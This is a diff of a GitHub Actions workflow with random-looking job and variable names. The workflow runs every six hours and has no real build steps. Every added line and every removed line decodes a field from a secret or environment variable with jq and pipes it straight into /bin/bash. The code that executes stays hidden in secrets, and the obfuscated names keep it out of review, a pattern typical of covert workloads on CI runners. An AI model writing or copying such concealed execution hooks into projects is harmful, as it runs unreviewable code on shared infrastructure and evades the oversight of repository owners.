@@ -1,8 +1,9 @@
 name: fujiancheng7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '42 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,25 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: fujiancheng7654
         env:
-          hf576: ${{ secrets.hf576 }}
+          inev81801: ${{ secrets.inev81801 }}
         run: |
-          echo $hf576 | jq -r .c9 | /bin/bash
-          echo $dajo8427 | jq -r .h8 | /bin/bash
-          echo $ich0 | jq -r .c7214 | /bin/bash
-          echo $v004 | jq -r .zipg760 | /bin/bash
-          echo $pkic8 | jq -r .wtpes87 | /bin/bash
-          echo $yga018 | jq -r .iawd75870 | /bin/bash
-          echo $pvu989 | jq -r .boxkc354 | /bin/bash
-          echo $izqbb44 | jq -r .agktp45272 | /bin/bash
-          echo $emyj686 | jq -r .sq5 | /bin/bash
-          echo $jbxs3 | jq -r .hj20 | /bin/bash
-          echo $sw418 | jq -r .kp55521 | /bin/bash
-          echo $ulpyo46425 | jq -r .lai5 | /bin/bash
-          echo $zioc587 | jq -r .kue9624 | /bin/bash
-          echo $qnxtl851 | jq -r .g79 | /bin/bash
-          echo $mosm0719 | jq -r .jml241 | /bin/bash
-          echo $tta6 | jq -r .v9 | /bin/bash
-          echo $ww8 | jq -r .oeo4441 | /bin/bash
-          echo $w802 | jq -r .t08012 | /bin/bash
-          echo $w5 | jq -r .vb11 | /bin/bash
+          echo $inev81801 | jq -r .vcjk9325 | /bin/bash
+          echo $seylf0 | jq -r .dlgi54605 | /bin/bash
+          echo $lnz36 | jq -r .rqhd406 | /bin/bash
+          echo $w1769 | jq -r .ubat3 | /bin/bash
+          echo $vpz5 | jq -r .ta2132 | /bin/bash
 
